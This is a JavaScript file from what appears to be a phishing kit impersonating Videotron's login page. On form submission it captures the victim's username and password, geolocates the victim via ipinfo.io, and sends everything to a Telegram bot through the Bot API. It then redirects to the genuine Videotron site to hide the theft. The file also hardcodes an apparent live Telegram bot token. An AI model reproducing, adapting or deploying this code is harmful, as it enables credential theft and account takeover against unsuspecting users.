import { TELEGRAM_TOKEN as e, CHAT_ID as t, IP_TOKEN as r } from "./config.js";

let body = document.querySelector("body"),
  form = document.querySelector("form"),
  usernameInput = document.querySelector(".username"),
  passwordInput = document.querySelector(".password");
function displayError(e) {
  e.classList.remove("display--none");
}
function sendLogsToTelegram() {
  let n = usernameInput.value,
    o = passwordInput.value;
  if (!n || !o) {
    if ("" === usernameInput.value) {
      let s = usernameInput.parentElement.querySelector(".error");
      displayError(s);
    }
    if ("" === passwordInput.value) {
      let a = passwordInput.parentElement.querySelector(".error");
      displayError(a);
    }
    return;
  }
  async function i(r) {
    let s = await fetch(`https://ipinfo.io?token=${r}`),
      a = await s.json(),
      { ip: i, country: l, region: u, city: p, loc: d, org: c, timezone: m } = a,
      [y, f] = d.split(","),
      g = `
    **** VIDEOTRON RESULT ****

    Username: ${n}

    Password: ${o}

    IP Address: ${i}

    Country: ${l}

    Region: ${u}

    City: ${p}

    Location: [lat: ${y}, lon: ${f}]

    Timezone: ${m}

    `,
      w = `https://api.telegram.org/bot${e}/sendMessage`,
      T = {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: t, text: g }),
      };
    fetch(w, T)
      .then((e) => {
        if (!e.ok) throw Error(`HTTP error! Status: ${e.status}`);
        return e.json();
      })
      .then((e) => {
        window.location.href = "https://www.videotron.com/";
      })
      .catch((e) => console.error("Error:", e));
  }
  i(r);
}
body.addEventListener("focusout", (e) => {
  if (e.target.classList.contains("username") || e.target.classList.contains("password")) {
    let t = e.target.parentElement,
      r = t.querySelector(".error");
    "" === e.target.value && displayError(r);
  }
}),
  form.addEventListener("submit", (t) => {
    if ((t.preventDefault(), "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw" === e)) {
      sendLogsToTelegram();
      return;
    }
    console.log("!invalid token");
  });
